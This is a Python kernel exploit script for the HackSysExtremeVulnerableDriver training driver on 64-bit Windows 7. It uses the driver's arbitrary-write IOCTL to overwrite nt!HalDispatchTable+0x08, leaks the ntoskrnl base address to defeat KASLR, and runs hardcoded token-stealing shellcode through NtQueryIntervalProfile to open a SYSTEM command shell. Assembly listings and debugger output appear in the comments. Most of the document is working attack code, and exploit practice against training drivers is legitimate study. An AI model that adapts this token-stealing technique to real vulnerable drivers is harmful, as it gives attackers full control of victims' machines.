from ctypes import *
import os
import struct
import subprocess

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

def ctl_code(code):
	"""
	Recreate CTL_CODE macro to generate driver IOCTL
	"""
	FILE_DEVICE_UNKNOWN = 0x22
	FILE_ANY_ACCESS = 0
	METHOD_NEITHER = 3

	return ((FILE_DEVICE_UNKNOWN << 16) | (FILE_ANY_ACCESS << 14) | (code << 2) | METHOD_NEITHER)

def _get_ntoskrnl():
	""" 
	ntoskrnl base address dump (in case for mem leak attacks)
	"""
	array_uint64_t = (c_ulonglong * 1024)()

	ntoskrnl_addr = psapi.EnumDeviceDrivers(
	    byref(array_uint64_t),	# lpImageBase
	    sizeof(array_uint64_t), 	# cb 
	    byref(c_long()) 		# lpcbNeeded
	    )

	return array_uint64_t[0]

def _gen_shellcode_buffer(shellcode):
	"""
	Generate shellcode buffer then return his address
	"""
	MEM_COMMIT_MEM_RESERVE = 0x3000
	PAGE_EXECUTE_READWRITE = 0x40
	
	# allocate shellcode in user-land address range
	ptr = kernel32.VirtualAlloc(
		c_int(0), 			# lpAddress
		c_int(len(shellcode)),		# dwSize
		c_int(MEM_COMMIT_MEM_RESERVE), 	# flAllocationType
		c_int(PAGE_EXECUTE_READWRITE)	# flProtect 
		)

	# shellcode address pointer
	shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

	# move shellcode to junk RWX buffer
	kernel32.RtlMoveMemory(
		c_int(ptr),
		shellcode_ptr,
		c_int(len(shellcode))
		)
	
	return ptr

def _HANDLE_driver_connection():
	""" 
	Create handle to driver 
	"""
	handle = kernel32.CreateFileA(
	    "\\\\.\\HackSysExtremeVulnerableDriver",	# lpFileName
	    0xC0000000, 	 			# dwDesiredAccess
	    0, 						# dwShareMode
	    None, 					# lpSecurityAttributes
	    0x3, 					# dwCreationDisposition
	    0, 						# dwFlagsAndAttributes
	    None 					# hTemplateFile
	    )

	return handle

def _send_payload(handle, payload_ptr, payload_len, code):
	"""
	Interacting with the driver
	"""
	IO_CTL = kernel32.DeviceIoControl(
	    handle, 			        # hDevice
	    ctl_code(code), 			# dwIoControlCode
	    payload_ptr,      			# lpInBuffer
	    payload_len, 		  	# nInBufferSize
	    None, 				# lpOutBuffer
	    0, 					# nOutBufferSize
	    byref(c_ulong()), 			# lpBytesReturned
	    None 				# lpOverlapped
	    )	
	
	return IO_CTL

def exploit():
	"""
	https://defuse.ca/online-x86-assembler.htm#disassembly
	https://blahcat.github.io/2017/08/14/a-primer-to-windows-x64-shellcoding/
	
	push rax
	push rbx
	push rcx

	mov rax, qword ptr [gs:0x188]
	mov rax, qword ptr [rax + 0x70]

	mov rbx, rax

	findPID:

	mov rbx, qword ptr [rbx + 0x188]
	sub rbx, 0x188
	mov rcx, qword ptr [rbx+ 0x180]
	cmp rcx, 4
	jnz findPID

	mov rcx, qword ptr [rbx + 0x208]
	and cl, 0xf0
	mov qword ptr [rax + 0x208], rcx

	pop rcx
	pop rbx
	pop rax
	; add rsp, 40 ->  stack alignment not necessary 
	; xor rax, rax -> also not necessary
	ret

	# CUSTOM win7 x64 7601.17514.amd64fre.win7sp1_rtm.101119-1850 kshellcode

	Before shellcode:
	kd> r 
	rax=0000000000000000 rbx=00000000022cd290 rcx=0000000000000001
	rdx=000000000000000c rsi=0000000000000010 rdi=0000000000000001
	rip=0000000000140000 rsp=fffff88006a38a68 rbp=fffff88006a38b60
	 r8=fffff88006a38a90  r9=fffff88006a38ab0 r10=fffff80002e580a0
	r11=000000000037bda0 r12=0000000000000002 r13=00000000003cf5d0
	r14=00000000776d2510 r15=0ffffffffffffff0
	iopl=0         nv up ei pl nz na pe nc
	cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
	00000000`00140000 cc              int     3
	kd> k
	 # Child-SP          RetAddr           Call Site
	00 fffff880`06a38a68 fffff800`02e48ba9 0x140000
	01 fffff880`06a38a70 fffff800`02e580dd nt!KeQueryIntervalProfile+0x39 -> it should be hitted after kshellcode [ret] without stack alignment, aka (add rsp...)
	02 fffff880`06a38ab0 fffff800`02ada8d3 nt!NtQueryIntervalProfile+0x3d
	03 fffff880`06a38ae0 00000000`776d251a nt!KiSystemServiceCopyEnd+0x13
	04 00000000`003cf358 00000000`73b51c53 0x776d251a
	05 00000000`003cf360 00000000`00002408 0x73b51c53
	06 00000000`003cf368 00000000`022cd290 0x2408
	07 00000000`003cf370 00000000`00000001 0x22cd290
	08 00000000`003cf378 00000000`77482eed 0x1
	09 00000000`003cf380 00000000`0222c3e8 0x77482eed
	0a 00000000`003cf388 00000000`0222c560 0x222c3e8
	0b 00000000`003cf390 00000000`003cf360 0x222c560
	0c 00000000`003cf398 00000000`00000000 0x3cf360

	"""
	SHELLCODE = bytearray(
		"\x50\x53\x51\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x40\x70\x48\x89\xC3\x48\x8B\x9B\x88\x01\x00\x00\x48\x81\xEB\x88\x01\x00\x00\x48\x8B\x8B\x80\x01\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B\x8B\x08\x02\x00\x00\x80\xE1\xF0\x48\x89\x88\x08\x02\x00\x00\x59\x5B\x58\xC3"
	)

	# IOCTL to trigger the stack overflow vulnerability
	# copied from HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h

	HEVD_IOCTL_WRITE_WHAT_WHERE = 0x802  # ctl_code(0x802)

	# driver file handler 
	hFile = _HANDLE_driver_connection()		  
	print("\n[+] Driver connection initilized!")

	# shellcode buffer address located in user-land
	sbuffer = _gen_shellcode_buffer(SHELLCODE)	
	print("[+] User buffer allocated at: [0x%x]\n" % sbuffer)

	# leak ntoskrnl base address | KASLR bypass
	ntoskrnl = _get_ntoskrnl()	
	print("[*] ntoskrnl.exe: [0x%x]" % ntoskrnl)

	ntHalDispatchTable_0x08 = ntoskrnl + 0x001f1c60 + 0x08
	print("[*] nt!HalDispatchTable+0x08: [0x%x]" % ntHalDispatchTable_0x08)

	# lpInBuffer will turn into array 
	dummyvar = c_void_p(sbuffer)
	print("[*] Dummy var PTR -> shellcode addr: [0x%x]" % id(dummyvar))

	payload = struct.pack("<Q", addressof(dummyvar))	# WHAT
	payload += struct.pack("<Q", ntHalDispatchTable_0x08)  	# WHERE

	payload_ptr = id(payload) + 32
	payload_len = len(payload)

	# raw_input("press any key to continue...")

	print("\nGetting SYSTEM Shell...\n")
	_send_payload(hFile, payload_ptr, payload_len, HEVD_IOCTL_WRITE_WHAT_WHERE)

	ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))

	os.system('cmd.exe') 

if __name__ == "__main__":
	""" 
	References: 
	
	https://h0mbre.github.io/HEVD_AbitraryWrite_64bit/
	https://www.abatchy.com/2018/01/kernel-exploitation-7
   	https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win7%20x86/HEVD_arbitraryoverwrite.py

	HEVD explanation: 
		
		How can i input my payload buffer into ArbitraryWrite.c IOCTL?

		https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/ArbitraryWrite.c#L63
			...
					NTSTATUS
			TriggerArbitraryWrite(
			    _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere
			)
			{
			    PULONG_PTR What = NULL;  ->  PULONG address for each [payload += (struct.pack("<Q", X))]
			    PULONG_PTR Where = NULL;
			    NTSTATUS Status = STATUS_SUCCESS;

			    PAGED_CODE();

			    __try 
				....
		
				Exploit code Example:
					payload = struct.pack("<Q", addressof(dummyvar))	# WHAT
					payload += struct.pack("<Q", ntHalDispatchTable_0x08)  	# WHERE

					|
					v

					PULONG_PTR What = struct.pack("<Q", addressof(dummyvar))
			    	PULONG_PTR Where = struct.pack("<Q", ntHalDispatchTable_0x08)

				   	WriteWhatWhere:
				   		What = shellcode address (user-land)
						Where = nt!HalDispatchTable+0x08 (x64 kernel-land)
				   		
						   	kd> dqs nt!HalDispatchTable+0x08
							fffff800`02c4cc68  00000000`00320000 -> User land shellcode
							fffff800`02c4cc70  fffff800`02a4c470
							fffff800`02c4cc78  fffff800`02e4af20 nt!xHalStartMirroring
							fffff800`02c4cc80  00000000`00000000
							fffff800`02c4cc88  fffff800`02b252f0 nt!HalExamineMBR
							fffff800`02c4cc90  fffff800`02dfd044 nt!IoReadPartitionTable
							fffff800`02c4cc98  fffff800`02dfd990 nt!IoSetPartitionInformation
							fffff800`02c4cca0  fffff800`02f3a0d0 nt!IoWritePartitionTable
							fffff800`02c4cca8  fffff800`02b09090 nt!WheapDefaultErrSrcCorrect
							fffff800`02c4ccb0  fffff800`02acd510 nt!xHalPrepareForBugcheck
							fffff800`02c4ccb8  fffff800`02acd510 nt!xHalPrepareForBugcheck
							fffff800`02c4ccc0  fffff800`02a4aca4
							fffff800`02c4ccc8  fffff800`02a4be88
							fffff800`02c4ccd0  fffff800`02a20534
							fffff800`02c4ccd8  fffff800`02a4ac18
							fffff800`02c4cce0  fffff800`02e4af20 nt!xHalStartMirroring

							NtQueryIntervalProfile: 

								The follow function should trigger our nt!HalDispatchTable+0x08 address then jump to it
								
								ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong())) -> first arg should be whatever (int)
	"""

	exploit()
